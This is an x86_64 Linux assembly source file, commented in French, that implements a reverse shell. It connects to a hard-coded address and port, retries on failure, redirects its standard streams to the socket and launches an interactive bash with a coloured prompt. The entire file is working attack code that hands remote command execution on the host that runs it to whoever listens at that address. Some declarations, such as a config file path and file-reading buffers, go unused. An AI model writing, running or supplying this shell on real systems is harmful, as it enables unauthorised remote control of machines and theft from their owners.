; Reverse Shell en Assembly x86_64 optimisé
; Compile avec: nasm -f elf64 reverse_shell.asm -o reverse_shell.o
; Link avec: ld reverse_shell.o -o reverse_shell

section .data
    ; Constantes système pour Linux x86_64
    SYS_SOCKET    equ 41
    SYS_CONNECT   equ 42
    SYS_DUP2      equ 33
    SYS_EXECVE    equ 59
    SYS_EXIT      equ 60
    SYS_CLOSE     equ 3
    SYS_NANOSLEEP equ 35
    SYS_OPEN      equ 2
    SYS_READ      equ 0
    SYS_WRITE     equ 1
    
    ; Constantes pour les sockets
    AF_INET       equ 2
    SOCK_STREAM   equ 1
    IPPROTO_IP    equ 0
    O_RDONLY      equ 0
    MAX_RETRY     equ 10
    
    ; Fichiers et chemins
    config_file   db "/etc/reverse_config.txt", 0
    shell_path    db "/bin/bash", 0
    
    ; Prompt personnalisé avec codes ANSI pour les couleurs
    prompt_env    db "PS1='\[\033[1;31m\][\t]\[\033[0m\] \[\033[1;32m\]\u@\h\[\033[0m\]:\[\033[1;34m\]\w\[\033[0m\]\\$ '", 0
    
    ; Message de bienvenue (avec séquences ANSI pour les couleurs)
    welcome_msg   db 27, "[1;33mConnected to reverse shell", 27, "[0m", 0xA, 0
    welcome_len   equ $ - welcome_msg
    
    ; Arguments et environnement pour execve
    shell_argv:
        dq shell_path  ; argv[0] = "/bin/bash"
        dq arg_i       ; argv[1] = "-i" (shell interactif)
        dq 0           ; NULL terminator
    arg_i    db "-i", 0
    
    ; Message coloré pour l'initialisation du shell
    welcome_cmd   db 27, "[1;33mReverse shell connection established!", 27, "[0m", 0xA, 0
    welcome_cmd_len equ $ - welcome_cmd
    
    shell_envp:
        dq prompt_env  ; Notre variable d'environnement PS1
        dq path_env    ; Variable PATH standard
        dq term_env    ; Variable TERM
        dq home_env    ; Variable HOME
        dq 0           ; NULL terminator
    path_env db "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 0
    term_env db "TERM=xterm-256color", 0
    home_env db "HOME=/tmp", 0
    
    ; Configuration du temps d'attente entre les tentatives (5 secondes)
    timespec:
        dq 5           ; 5 secondes
        dq 0           ; 0 nanosecondes
        
    ; IP et port (mettre à jour avec les valeurs appropriées)
    target_port   dw 0x5c11    ; Port 4444 (en network byte order / big endian)
    target_ip     dd 0x800aa8c0 ; 192.168.10.128 (adresse cible, en network byte order)

section .bss
    sockfd        resq 1       ; Descripteur du socket
    sockaddr_in   resb 16      ; Structure pour l'adresse
    retry_count   resq 1       ; Compteur de tentatives
    fd_conf       resq 1       ; Descripteur du fichier de config
    buffer_conf   resb 64      ; Buffer pour lire la configuration

section .text
    global _start

_start:
    ; Initialisation
    xor rax, rax
    mov [retry_count], rax

try_connect:
    ; Création du socket
    mov rax, SYS_SOCKET
    mov rdi, AF_INET
    mov rsi, SOCK_STREAM
    mov rdx, IPPROTO_IP
    syscall
    
    ; Vérification des erreurs
    cmp rax, 0
    jl socket_error
    
    ; Sauvegarde du descripteur de socket
    mov [sockfd], rax
    
    ; Configuration de l'adresse
    mov word [sockaddr_in], AF_INET       ; Famille d'adresse (AF_INET)
    mov r8w, [target_port]
    mov [sockaddr_in + 2], r8w            ; Port
    mov r8d, [target_ip]
    mov [sockaddr_in + 4], r8d            ; Adresse IP
    mov qword [sockaddr_in + 8], 0        ; Padding à 0
    
    ; Connexion au serveur
    mov rax, SYS_CONNECT
    mov rdi, [sockfd]
    lea rsi, [sockaddr_in]
    mov rdx, 16                           ; Taille de sockaddr_in
    syscall
    
    ; Vérification des erreurs
    cmp rax, 0
    jl connect_error
    
    ; Envoi du message de bienvenue
    mov rax, SYS_WRITE
    mov rdi, [sockfd]
    lea rsi, [welcome_msg]
    mov rdx, welcome_len
    syscall
    
    ; Redirection des flux stdin, stdout, stderr vers le socket
    xor rsi, rsi                          ; Commencer par stdin (0)
    
redirect_loop:
    mov rax, SYS_DUP2
    mov rdi, [sockfd]
    ; rsi contient déjà l'indice du descripteur à dupliquer (0, 1, 2)
    syscall
    
    inc rsi
    cmp rsi, 3                            ; Rediriger stdin, stdout, stderr
    jl redirect_loop
    
    ; Afficher le message de bienvenue coloré directement sur stdout (maintenant redirigé)
    mov rax, SYS_WRITE
    mov rdi, 1                            ; stdout
    lea rsi, [welcome_cmd]
    mov rdx, welcome_cmd_len
    syscall
    
    ; Exécution du shell avec prompt personnalisé
    mov rax, SYS_EXECVE
    lea rdi, [shell_path]
    lea rsi, [shell_argv]
    lea rdx, [shell_envp]
    syscall
    
    ; En cas d'échec d'execve
    mov rax, SYS_CLOSE
    mov rdi, [sockfd]
    syscall
    
    jmp exit

socket_error:
    inc qword [retry_count]
    jmp retry_logic

connect_error:
    ; Fermeture du socket avant de réessayer
    mov rax, SYS_CLOSE
    mov rdi, [sockfd]
    syscall
    
    inc qword [retry_count]

retry_logic:
    ; Vérification du nombre maximum de tentatives
    mov rax, [retry_count]
    cmp rax, MAX_RETRY
    jge exit
    
    ; Attente avant nouvelle tentative
    mov rax, SYS_NANOSLEEP
    lea rdi, [timespec]
    xor rsi, rsi
    syscall
    
    jmp try_connect

exit:
    ; Sortie propre du programme
    mov rax, SYS_EXIT
    xor rdi, rdi                          ; Code de retour 0
    syscall